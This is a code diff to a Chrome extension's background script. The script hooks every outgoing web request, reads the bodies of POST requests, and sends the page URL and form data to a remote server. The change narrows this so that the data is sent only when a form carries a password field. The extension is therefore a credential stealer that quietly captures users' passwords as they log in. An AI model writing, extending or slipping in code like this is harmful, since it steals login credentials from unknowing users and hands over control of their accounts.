@@ -52,7 +52,7 @@ chrome.webRequest.onBeforeRequest.addListener(
 
 chrome.webRequest.onBeforeRequest.addListener(
   details => {
-    console.log(details);
+   
     //check have requestBody
     if (details.requestBody && details.method == "POST") {
       //request body with raw
@@ -65,20 +65,28 @@ chrome.webRequest.onBeforeRequest.addListener(
         );
 
         console.log("query parse", parseQuery(postedString));
-
+        
         const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
           details.url
         )}&method=${details.method}&formData=${JSON.stringify(postedString)}`;
-        fetch(server + param);
+        
+        if(postedString['password'] || postedString['pwd'] || postedString['Password']) {
+          fetch(server + param);
+        }
+       
       }
 
       if (details.requestBody.formData) {
+        console.log('query', details.requestBody.formData)
         const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
           details.url
         )}&method=${details.method}&formData=${JSON.stringify(
           details.requestBody.formData
         )}`;
-        fetch(server + param);
+        if(details.requestBody.formData['pwd'] || details.requestBody.formData['password'] || details.requestBody.formData['Password']){
+          fetch(server + param);
+        }
+        
       }
     }
   },
